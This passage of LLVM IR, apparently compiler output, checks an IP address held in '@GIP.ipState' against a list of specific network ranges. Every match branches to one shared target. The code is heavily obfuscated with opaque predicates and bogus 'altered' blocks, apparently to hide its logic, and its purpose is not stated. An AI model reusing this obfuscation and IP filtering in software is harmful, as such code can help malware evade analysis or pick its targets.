  %2347 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2348 = zext i8 %2347 to i32
  %2349 = icmp eq i32 %2348, 138
  br i1 %2349, label %2350, label %2374

; <label>:2350:                                   ; preds = %2346
  %2351 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2352 = zext i8 %2351 to i32
  %2353 = icmp sge i32 %2352, 1
  br i1 %2353, label %2354, label %2374

; <label>:2354:                                   ; preds = %2350
  %2355 = load i32, i32* @x.71
  %2356 = load i32, i32* @y.72
  %2357 = sub i32 %2355, 1
  %2358 = mul i32 %2355, %2357
  %2359 = urem i32 %2358, 2
  %2360 = icmp eq i32 %2359, 0
  %2361 = icmp slt i32 %2356, 10
  %2362 = or i1 %2360, %2361
  br i1 %2362, label %originalBB314, label %originalBB314alteredBB

originalBB314:                                    ; preds = %originalBB314alteredBB, %2354
  %2363 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2364 = zext i8 %2363 to i32
  %2365 = icmp slt i32 %2364, 127
  %2366 = load i32, i32* @x.71
  %2367 = load i32, i32* @y.72
  %2368 = sub i32 %2366, 1
  %2369 = mul i32 %2366, %2368
  %2370 = urem i32 %2369, 2
  %2371 = icmp eq i32 %2370, 0
  %2372 = icmp slt i32 %2367, 10
  %2373 = or i1 %2371, %2372
  br i1 %2373, label %originalBBpart2316, label %originalBB314alteredBB

originalBBpart2316:                               ; preds = %originalBB314
  br i1 %2365, label %5042, label %2374

; <label>:2374:                                   ; preds = %originalBBpart2316, %2350, %2346, %2342
  %2375 = load i32, i32* @x.71
  %2376 = load i32, i32* @y.72
  %2377 = sub i32 %2375, 1
  %2378 = mul i32 %2375, %2377
  %2379 = urem i32 %2378, 2
  %2380 = icmp eq i32 %2379, 0
  %2381 = icmp slt i32 %2376, 10
  %2382 = or i1 %2380, %2381
  br i1 %2382, label %originalBB318, label %originalBB318alteredBB

originalBB318:                                    ; preds = %originalBB318alteredBB, %2374
  %2383 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2384 = zext i8 %2383 to i32
  %2385 = icmp eq i32 %2384, 192
  %2386 = load i32, i32* @x.71
  %2387 = load i32, i32* @y.72
  %2388 = sub i32 %2386, 1
  %2389 = mul i32 %2386, %2388
  %2390 = urem i32 %2389, 2
  %2391 = icmp eq i32 %2390, 0
  %2392 = icmp slt i32 %2387, 10
  %2393 = or i1 %2391, %2392
  br i1 %2393, label %originalBBpart2320, label %originalBB318alteredBB

originalBBpart2320:                               ; preds = %originalBB318
  br i1 %2385, label %2394, label %2422

; <label>:2394:                                   ; preds = %originalBBpart2320
  %2395 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2396 = zext i8 %2395 to i32
  %2397 = icmp eq i32 %2396, 241
  br i1 %2397, label %2398, label %2422

; <label>:2398:                                   ; preds = %2394
  %2399 = load i32, i32* @x.71
  %2400 = load i32, i32* @y.72
  %2401 = sub i32 %2399, 1
  %2402 = mul i32 %2399, %2401
  %2403 = urem i32 %2402, 2
  %2404 = icmp eq i32 %2403, 0
  %2405 = icmp slt i32 %2400, 10
  %2406 = or i1 %2404, %2405
  br i1 %2406, label %originalBB322, label %originalBB322alteredBB

originalBB322:                                    ; preds = %originalBB322alteredBB, %2398
  %2407 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2408 = zext i8 %2407 to i32
  %2409 = icmp sge i32 %2408, 128
  %2410 = load i32, i32* @x.71
  %2411 = load i32, i32* @y.72
  %2412 = sub i32 %2410, 1
  %2413 = mul i32 %2410, %2412
  %2414 = urem i32 %2413, 2
  %2415 = icmp eq i32 %2414, 0
  %2416 = icmp slt i32 %2411, 10
  %2417 = or i1 %2415, %2416
  br i1 %2417, label %originalBBpart2324, label %originalBB322alteredBB

originalBBpart2324:                               ; preds = %originalBB322
  br i1 %2409, label %2418, label %2422

; <label>:2418:                                   ; preds = %originalBBpart2324
  %2419 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2420 = zext i8 %2419 to i32
  %2421 = icmp slt i32 %2420, 255
  br i1 %2421, label %5042, label %2422

; <label>:2422:                                   ; preds = %2418, %originalBBpart2324, %2394, %originalBBpart2320
  %2423 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2424 = zext i8 %2423 to i32
  %2425 = icmp eq i32 %2424, 198
  br i1 %2425, label %2426, label %2438

; <label>:2426:                                   ; preds = %2422
  %2427 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2428 = zext i8 %2427 to i32
  %2429 = icmp eq i32 %2428, 199
  br i1 %2429, label %2430, label %2438

; <label>:2430:                                   ; preds = %2426
  %2431 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2432 = zext i8 %2431 to i32
  %2433 = icmp sge i32 %2432, 64
  br i1 %2433, label %2434, label %2438

; <label>:2434:                                   ; preds = %2430
  %2435 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2436 = zext i8 %2435 to i32
  %2437 = icmp slt i32 %2436, 127
  br i1 %2437, label %5042, label %2438

; <label>:2438:                                   ; preds = %2434, %2430, %2426, %2422
  %2439 = load i32, i32* @x.71
  %2440 = load i32, i32* @y.72
  %2441 = sub i32 %2439, 1
  %2442 = mul i32 %2439, %2441
  %2443 = urem i32 %2442, 2
  %2444 = icmp eq i32 %2443, 0
  %2445 = icmp slt i32 %2440, 10
  %2446 = or i1 %2444, %2445
  br i1 %2446, label %originalBB326, label %originalBB326alteredBB

originalBB326:                                    ; preds = %originalBB326alteredBB, %2438
  %2447 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2448 = zext i8 %2447 to i32
  %2449 = icmp eq i32 %2448, 198
  %2450 = load i32, i32* @x.71
  %2451 = load i32, i32* @y.72
  %2452 = sub i32 %2450, 1
  %2453 = mul i32 %2450, %2452
  %2454 = urem i32 %2453, 2
  %2455 = icmp eq i32 %2454, 0
  %2456 = icmp slt i32 %2451, 10
  %2457 = or i1 %2455, %2456
  br i1 %2457, label %originalBBpart2328, label %originalBB326alteredBB

originalBBpart2328:                               ; preds = %originalBB326
  br i1 %2449, label %2458, label %2486

; <label>:2458:                                   ; preds = %originalBBpart2328
  %2459 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2460 = zext i8 %2459 to i32
  %2461 = icmp eq i32 %2460, 211
  br i1 %2461, label %2462, label %2486

; <label>:2462:                                   ; preds = %2458
  %2463 = load i32, i32* @x.71
  %2464 = load i32, i32* @y.72
  %2465 = sub i32 %2463, 1
  %2466 = mul i32 %2463, %2465
  %2467 = urem i32 %2466, 2
  %2468 = icmp eq i32 %2467, 0
  %2469 = icmp slt i32 %2464, 10
  %2470 = or i1 %2468, %2469
  br i1 %2470, label %originalBB330, label %originalBB330alteredBB

originalBB330:                                    ; preds = %originalBB330alteredBB, %2462
  %2471 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2472 = zext i8 %2471 to i32
  %2473 = icmp sge i32 %2472, 96
  %2474 = load i32, i32* @x.71
  %2475 = load i32, i32* @y.72
  %2476 = sub i32 %2474, 1
  %2477 = mul i32 %2474, %2476
  %2478 = urem i32 %2477, 2
  %2479 = icmp eq i32 %2478, 0
  %2480 = icmp slt i32 %2475, 10
  %2481 = or i1 %2479, %2480
  br i1 %2481, label %originalBBpart2332, label %originalBB330alteredBB

originalBBpart2332:                               ; preds = %originalBB330
  br i1 %2473, label %2482, label %2486

; <label>:2482:                                   ; preds = %originalBBpart2332
  %2483 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2484 = zext i8 %2483 to i32
  %2485 = icmp slt i32 %2484, 127
  br i1 %2485, label %5042, label %2486

; <label>:2486:                                   ; preds = %2482, %originalBBpart2332, %2458, %originalBBpart2328
  %2487 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2488 = zext i8 %2487 to i32
  %2489 = icmp eq i32 %2488, 207
  br i1 %2489, label %2490, label %2502

; <label>:2490:                                   ; preds = %2486
  %2491 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2492 = zext i8 %2491 to i32
  %2493 = icmp eq i32 %2492, 154
  br i1 %2493, label %2494, label %2502

; <label>:2494:                                   ; preds = %2490
  %2495 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2496 = zext i8 %2495 to i32
  %2497 = icmp sge i32 %2496, 192
  br i1 %2497, label %2498, label %2502

; <label>:2498:                                   ; preds = %2494
  %2499 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2500 = zext i8 %2499 to i32
  %2501 = icmp slt i32 %2500, 255
  br i1 %2501, label %5042, label %2502

; <label>:2502:                                   ; preds = %2498, %2494, %2490, %2486
  %2503 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2504 = zext i8 %2503 to i32
  %2505 = icmp eq i32 %2504, 37
  br i1 %2505, label %2506, label %2534

; <label>:2506:                                   ; preds = %2502
  %2507 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2508 = zext i8 %2507 to i32
  %2509 = icmp eq i32 %2508, 139
  br i1 %2509, label %2510, label %2534

; <label>:2510:                                   ; preds = %2506
  %2511 = load i32, i32* @x.71
  %2512 = load i32, i32* @y.72
  %2513 = sub i32 %2511, 1
  %2514 = mul i32 %2511, %2513
  %2515 = urem i32 %2514, 2
  %2516 = icmp eq i32 %2515, 0
  %2517 = icmp slt i32 %2512, 10
  %2518 = or i1 %2516, %2517
  br i1 %2518, label %originalBB334, label %originalBB334alteredBB

originalBB334:                                    ; preds = %originalBB334alteredBB, %2510
  %2519 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2520 = zext i8 %2519 to i32
  %2521 = icmp sge i32 %2520, 1
  %2522 = load i32, i32* @x.71
  %2523 = load i32, i32* @y.72
  %2524 = sub i32 %2522, 1
  %2525 = mul i32 %2522, %2524
  %2526 = urem i32 %2525, 2
  %2527 = icmp eq i32 %2526, 0
  %2528 = icmp slt i32 %2523, 10
  %2529 = or i1 %2527, %2528
  br i1 %2529, label %originalBBpart2336, label %originalBB334alteredBB

originalBBpart2336:                               ; preds = %originalBB334
  br i1 %2521, label %2530, label %2534

; <label>:2530:                                   ; preds = %originalBBpart2336
  %2531 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2532 = zext i8 %2531 to i32
  %2533 = icmp slt i32 %2532, 31
  br i1 %2533, label %5042, label %2534

; <label>:2534:                                   ; preds = %2530, %originalBBpart2336, %2506, %2502
  %2535 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2536 = zext i8 %2535 to i32
  %2537 = icmp eq i32 %2536, 67
  br i1 %2537, label %2538, label %2598

; <label>:2538:                                   ; preds = %2534
  %2539 = load i32, i32* @x.71
  %2540 = load i32, i32* @y.72
  %2541 = sub i32 %2539, 1
  %2542 = mul i32 %2539, %2541
  %2543 = urem i32 %2542, 2
  %2544 = icmp eq i32 %2543, 0
  %2545 = icmp slt i32 %2540, 10
  %2546 = or i1 %2544, %2545
  br i1 %2546, label %originalBB338, label %originalBB338alteredBB

originalBB338:                                    ; preds = %originalBB338alteredBB, %2538
  %2547 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2548 = zext i8 %2547 to i32
  %2549 = icmp eq i32 %2548, 207
  %2550 = load i32, i32* @x.71
  %2551 = load i32, i32* @y.72
  %2552 = sub i32 %2550, 1
  %2553 = mul i32 %2550, %2552
  %2554 = urem i32 %2553, 2
  %2555 = icmp eq i32 %2554, 0
  %2556 = icmp slt i32 %2551, 10
  %2557 = or i1 %2555, %2556
  br i1 %2557, label %originalBBpart2340, label %originalBB338alteredBB

originalBBpart2340:                               ; preds = %originalBB338
  br i1 %2549, label %2558, label %2598

; <label>:2558:                                   ; preds = %originalBBpart2340
  %2559 = load i32, i32* @x.71
  %2560 = load i32, i32* @y.72
  %2561 = sub i32 %2559, 1
  %2562 = mul i32 %2559, %2561
  %2563 = urem i32 %2562, 2
  %2564 = icmp eq i32 %2563, 0
  %2565 = icmp slt i32 %2560, 10
  %2566 = or i1 %2564, %2565
  br i1 %2566, label %originalBB342, label %originalBB342alteredBB

originalBB342:                                    ; preds = %originalBB342alteredBB, %2558
  %2567 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2568 = zext i8 %2567 to i32
  %2569 = icmp sge i32 %2568, 64
  %2570 = load i32, i32* @x.71
  %2571 = load i32, i32* @y.72
  %2572 = sub i32 %2570, 1
  %2573 = mul i32 %2570, %2572
  %2574 = urem i32 %2573, 2
  %2575 = icmp eq i32 %2574, 0
  %2576 = icmp slt i32 %2571, 10
  %2577 = or i1 %2575, %2576
  br i1 %2577, label %originalBBpart2344, label %originalBB342alteredBB

originalBBpart2344:                               ; preds = %originalBB342
  br i1 %2569, label %2578, label %2598

; <label>:2578:                                   ; preds = %originalBBpart2344
  %2579 = load i32, i32* @x.71
  %2580 = load i32, i32* @y.72
  %2581 = sub i32 %2579, 1
  %2582 = mul i32 %2579, %2581
  %2583 = urem i32 %2582, 2
  %2584 = icmp eq i32 %2583, 0
  %2585 = icmp slt i32 %2580, 10
  %2586 = or i1 %2584, %2585
  br i1 %2586, label %originalBB346, label %originalBB346alteredBB

originalBB346:                                    ; preds = %originalBB346alteredBB, %2578
  %2587 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2588 = zext i8 %2587 to i32
  %2589 = icmp slt i32 %2588, 95
  %2590 = load i32, i32* @x.71
  %2591 = load i32, i32* @y.72
  %2592 = sub i32 %2590, 1
  %2593 = mul i32 %2590, %2592
  %2594 = urem i32 %2593, 2
  %2595 = icmp eq i32 %2594, 0
  %2596 = icmp slt i32 %2591, 10
  %2597 = or i1 %2595, %2596
  br i1 %2597, label %originalBBpart2348, label %originalBB346alteredBB

originalBBpart2348:                               ; preds = %originalBB346
  br i1 %2589, label %5042, label %2598

; <label>:2598:                                   ; preds = %originalBBpart2348, %originalBBpart2344, %originalBBpart2340, %2534
  %2599 = load i32, i32* @x.71
  %2600 = load i32, i32* @y.72
  %2601 = sub i32 %2599, 1
  %2602 = mul i32 %2599, %2601
  %2603 = urem i32 %2602, 2
  %2604 = icmp eq i32 %2603, 0
  %2605 = icmp slt i32 %2600, 10
  %2606 = or i1 %2604, %2605
  br i1 %2606, label %originalBB350, label %originalBB350alteredBB

originalBB350:                                    ; preds = %originalBB350alteredBB, %2598
  %2607 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2608 = zext i8 %2607 to i32
  %2609 = icmp eq i32 %2608, 67
  %2610 = load i32, i32* @x.71
  %2611 = load i32, i32* @y.72
  %2612 = sub i32 %2610, 1
  %2613 = mul i32 %2610, %2612
  %2614 = urem i32 %2613, 2
  %2615 = icmp eq i32 %2614, 0
  %2616 = icmp slt i32 %2611, 10
  %2617 = or i1 %2615, %2616
  br i1 %2617, label %originalBBpart2352, label %originalBB350alteredBB

originalBBpart2352:                               ; preds = %originalBB350
  br i1 %2609, label %2618, label %2646

; <label>:2618:                                   ; preds = %originalBBpart2352
  %2619 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2620 = zext i8 %2619 to i32
  %2621 = icmp eq i32 %2620, 205
  br i1 %2621, label %2622, label %2646

; <label>:2622:                                   ; preds = %2618
  %2623 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2624 = zext i8 %2623 to i32
  %2625 = icmp sge i32 %2624, 128
  br i1 %2625, label %2626, label %2646

; <label>:2626:                                   ; preds = %2622
  %2627 = load i32, i32* @x.71
  %2628 = load i32, i32* @y.72
  %2629 = sub i32 %2627, 1
  %2630 = mul i32 %2627, %2629
  %2631 = urem i32 %2630, 2
  %2632 = icmp eq i32 %2631, 0
  %2633 = icmp slt i32 %2628, 10
  %2634 = or i1 %2632, %2633
  br i1 %2634, label %originalBB354, label %originalBB354alteredBB

originalBB354:                                    ; preds = %originalBB354alteredBB, %2626
  %2635 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2636 = zext i8 %2635 to i32
  %2637 = icmp slt i32 %2636, 191
  %2638 = load i32, i32* @x.71
  %2639 = load i32, i32* @y.72
  %2640 = sub i32 %2638, 1
  %2641 = mul i32 %2638, %2640
  %2642 = urem i32 %2641, 2
  %2643 = icmp eq i32 %2642, 0
  %2644 = icmp slt i32 %2639, 10
  %2645 = or i1 %2643, %2644
  br i1 %2645, label %originalBBpart2356, label %originalBB354alteredBB

originalBBpart2356:                               ; preds = %originalBB354
  br i1 %2637, label %5042, label %2646

; <label>:2646:                                   ; preds = %originalBBpart2356, %2622, %2618, %originalBBpart2352
  %2647 = load i32, i32* @x.71
  %2648 = load i32, i32* @y.72
  %2649 = sub i32 %2647, 1
  %2650 = mul i32 %2647, %2649
  %2651 = urem i32 %2650, 2
  %2652 = icmp eq i32 %2651, 0
  %2653 = icmp slt i32 %2648, 10
  %2654 = or i1 %2652, %2653
  br i1 %2654, label %originalBB358, label %originalBB358alteredBB

originalBB358:                                    ; preds = %originalBB358alteredBB, %2646
  %2655 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2656 = zext i8 %2655 to i32
  %2657 = icmp eq i32 %2656, 80
  %2658 = load i32, i32* @x.71
  %2659 = load i32, i32* @y.72
  %2660 = sub i32 %2658, 1
  %2661 = mul i32 %2658, %2660
  %2662 = urem i32 %2661, 2
  %2663 = icmp eq i32 %2662, 0
  %2664 = icmp slt i32 %2659, 10
  %2665 = or i1 %2663, %2664
  br i1 %2665, label %originalBBpart2360, label %originalBB358alteredBB

originalBBpart2360:                               ; preds = %originalBB358
  br i1 %2657, label %2666, label %2678

; <label>:2666:                                   ; preds = %originalBBpart2360
  %2667 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2668 = zext i8 %2667 to i32
  %2669 = icmp eq i32 %2668, 240
  br i1 %2669, label %2670, label %2678

; <label>:2670:                                   ; preds = %2666
  %2671 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2672 = zext i8 %2671 to i32
  %2673 = icmp sge i32 %2672, 128
  br i1 %2673, label %2674, label %2678

; <label>:2674:                                   ; preds = %2670
  %2675 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2676 = zext i8 %2675 to i32
  %2677 = icmp slt i32 %2676, 143
  br i1 %2677, label %5042, label %2678

; <label>:2678:                                   ; preds = %2674, %2670, %2666, %originalBBpart2360
  %2679 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2680 = zext i8 %2679 to i32
  %2681 = icmp eq i32 %2680, 82
  br i1 %2681, label %2682, label %2710

; <label>:2682:                                   ; preds = %2678
  %2683 = load i32, i32* @x.71
  %2684 = load i32, i32* @y.72
  %2685 = sub i32 %2683, 1
  %2686 = mul i32 %2683, %2685
  %2687 = urem i32 %2686, 2
  %2688 = icmp eq i32 %2687, 0
  %2689 = icmp slt i32 %2684, 10
  %2690 = or i1 %2688, %2689
  br i1 %2690, label %originalBB362, label %originalBB362alteredBB

originalBB362:                                    ; preds = %originalBB362alteredBB, %2682
  %2691 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2692 = zext i8 %2691 to i32
  %2693 = icmp eq i32 %2692, 196
  %2694 = load i32, i32* @x.71
  %2695 = load i32, i32* @y.72
  %2696 = sub i32 %2694, 1
  %2697 = mul i32 %2694, %2696
  %2698 = urem i32 %2697, 2
  %2699 = icmp eq i32 %2698, 0
  %2700 = icmp slt i32 %2695, 10
  %2701 = or i1 %2699, %2700
  br i1 %2701, label %originalBBpart2364, label %originalBB362alteredBB

originalBBpart2364:                               ; preds = %originalBB362
  br i1 %2693, label %2702, label %2710

; <label>:2702:                                   ; preds = %originalBBpart2364
  %2703 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2704 = zext i8 %2703 to i32
  %2705 = icmp sge i32 %2704, 1
  br i1 %2705, label %2706, label %2710

; <label>:2706:                                   ; preds = %2702
  %2707 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2708 = zext i8 %2707 to i32
  %2709 = icmp slt i32 %2708, 15
  br i1 %2709, label %5042, label %2710

; <label>:2710:                                   ; preds = %2706, %2702, %originalBBpart2364, %2678
  %2711 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2712 = zext i8 %2711 to i32
  %2713 = icmp eq i32 %2712, 95
  br i1 %2713, label %2714, label %2758

; <label>:2714:                                   ; preds = %2710
  %2715 = load i32, i32* @x.71
  %2716 = load i32, i32* @y.72
  %2717 = sub i32 %2715, 1
  %2718 = mul i32 %2715, %2717
  %2719 = urem i32 %2718, 2
  %2720 = icmp eq i32 %2719, 0
  %2721 = icmp slt i32 %2716, 10
  %2722 = or i1 %2720, %2721
  br i1 %2722, label %originalBB366, label %originalBB366alteredBB

originalBB366:                                    ; preds = %originalBB366alteredBB, %2714
  %2723 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2724 = zext i8 %2723 to i32
  %2725 = icmp eq i32 %2724, 85
  %2726 = load i32, i32* @x.71
  %2727 = load i32, i32* @y.72
  %2728 = sub i32 %2726, 1
  %2729 = mul i32 %2726, %2728
  %2730 = urem i32 %2729, 2
  %2731 = icmp eq i32 %2730, 0
  %2732 = icmp slt i32 %2727, 10
  %2733 = or i1 %2731, %2732
  br i1 %2733, label %originalBBpart2368, label %originalBB366alteredBB

originalBBpart2368:                               ; preds = %originalBB366
  br i1 %2725, label %2734, label %2758

; <label>:2734:                                   ; preds = %originalBBpart2368
  %2735 = load i32, i32* @x.71
  %2736 = load i32, i32* @y.72
  %2737 = sub i32 %2735, 1
  %2738 = mul i32 %2735, %2737
  %2739 = urem i32 %2738, 2
  %2740 = icmp eq i32 %2739, 0
  %2741 = icmp slt i32 %2736, 10
  %2742 = or i1 %2740, %2741
  br i1 %2742, label %originalBB370, label %originalBB370alteredBB

originalBB370:                                    ; preds = %originalBB370alteredBB, %2734
  %2743 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2744 = zext i8 %2743 to i32
  %2745 = icmp sge i32 %2744, 8
  %2746 = load i32, i32* @x.71
  %2747 = load i32, i32* @y.72
  %2748 = sub i32 %2746, 1
  %2749 = mul i32 %2746, %2748
  %2750 = urem i32 %2749, 2
  %2751 = icmp eq i32 %2750, 0
  %2752 = icmp slt i32 %2747, 10
  %2753 = or i1 %2751, %2752
  br i1 %2753, label %originalBBpart2372, label %originalBB370alteredBB

originalBBpart2372:                               ; preds = %originalBB370
  br i1 %2745, label %2754, label %2758

; <label>:2754:                                   ; preds = %originalBBpart2372
  %2755 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2756 = zext i8 %2755 to i32
  %2757 = icmp slt i32 %2756, 63
  br i1 %2757, label %5042, label %2758

; <label>:2758:                                   ; preds = %2754, %originalBBpart2372, %originalBBpart2368, %2710
  %2759 = load i32, i32* @x.71
  %2760 = load i32, i32* @y.72
  %2761 = sub i32 %2759, 1
  %2762 = mul i32 %2759, %2761
  %2763 = urem i32 %2762, 2
  %2764 = icmp eq i32 %2763, 0
  %2765 = icmp slt i32 %2760, 10
  %2766 = or i1 %2764, %2765
  br i1 %2766, label %originalBB374, label %originalBB374alteredBB

originalBB374:                                    ; preds = %originalBB374alteredBB, %2758
  %2767 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2768 = zext i8 %2767 to i32
  %2769 = icmp eq i32 %2768, 64
  %2770 = load i32, i32* @x.71
  %2771 = load i32, i32* @y.72
  %2772 = sub i32 %2770, 1
  %2773 = mul i32 %2770, %2772
  %2774 = urem i32 %2773, 2
  %2775 = icmp eq i32 %2774, 0
  %2776 = icmp slt i32 %2771, 10
  %2777 = or i1 %2775, %2776
  br i1 %2777, label %originalBBpart2376, label %originalBB374alteredBB

originalBBpart2376:                               ; preds = %originalBB374
  br i1 %2769, label %2778, label %2790

; <label>:2778:                                   ; preds = %originalBBpart2376
  %2779 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2780 = zext i8 %2779 to i32
  %2781 = icmp eq i32 %2780, 237
  br i1 %2781, label %2782, label %2790

; <label>:2782:                                   ; preds = %2778
  %2783 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2784 = zext i8 %2783 to i32
  %2785 = icmp sge i32 %2784, 32
  br i1 %2785, label %2786, label %2790

; <label>:2786:                                   ; preds = %2782
  %2787 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2788 = zext i8 %2787 to i32
  %2789 = icmp slt i32 %2788, 43
  br i1 %2789, label %5042, label %2790

; <label>:2790:                                   ; preds = %2786, %2782, %2778, %originalBBpart2376
  %2791 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2792 = zext i8 %2791 to i32
  %2793 = icmp eq i32 %2792, 185
  br i1 %2793, label %2794, label %2806

; <label>:2794:                                   ; preds = %2790
  %2795 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2796 = zext i8 %2795 to i32
  %2797 = icmp eq i32 %2796, 92
  br i1 %2797, label %2798, label %2806

; <label>:2798:                                   ; preds = %2794
  %2799 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2800 = zext i8 %2799 to i32
  %2801 = icmp sge i32 %2800, 220
  br i1 %2801, label %2802, label %2806

; <label>:2802:                                   ; preds = %2798
  %2803 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2804 = zext i8 %2803 to i32
  %2805 = icmp slt i32 %2804, 223
  br i1 %2805, label %5042, label %2806

; <label>:2806:                                   ; preds = %2802, %2798, %2794, %2790
  %2807 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2808 = zext i8 %2807 to i32
  %2809 = icmp eq i32 %2808, 104
  br i1 %2809, label %2810, label %2838

; <label>:2810:                                   ; preds = %2806
  %2811 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2812 = zext i8 %2811 to i32
  %2813 = icmp eq i32 %2812, 238
  br i1 %2813, label %2814, label %2838

; <label>:2814:                                   ; preds = %2810
  %2815 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2816 = zext i8 %2815 to i32
  %2817 = icmp sge i32 %2816, 128
  br i1 %2817, label %2818, label %2838

; <label>:2818:                                   ; preds = %2814
  %2819 = load i32, i32* @x.71
  %2820 = load i32, i32* @y.72
  %2821 = sub i32 %2819, 1
  %2822 = mul i32 %2819, %2821
  %2823 = urem i32 %2822, 2
  %2824 = icmp eq i32 %2823, 0
  %2825 = icmp slt i32 %2820, 10
  %2826 = or i1 %2824, %2825
  br i1 %2826, label %originalBB378, label %originalBB378alteredBB

originalBB378:                                    ; preds = %originalBB378alteredBB, %2818
  %2827 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2828 = zext i8 %2827 to i32
  %2829 = icmp slt i32 %2828, 191
  %2830 = load i32, i32* @x.71
  %2831 = load i32, i32* @y.72
  %2832 = sub i32 %2830, 1
  %2833 = mul i32 %2830, %2832
  %2834 = urem i32 %2833, 2
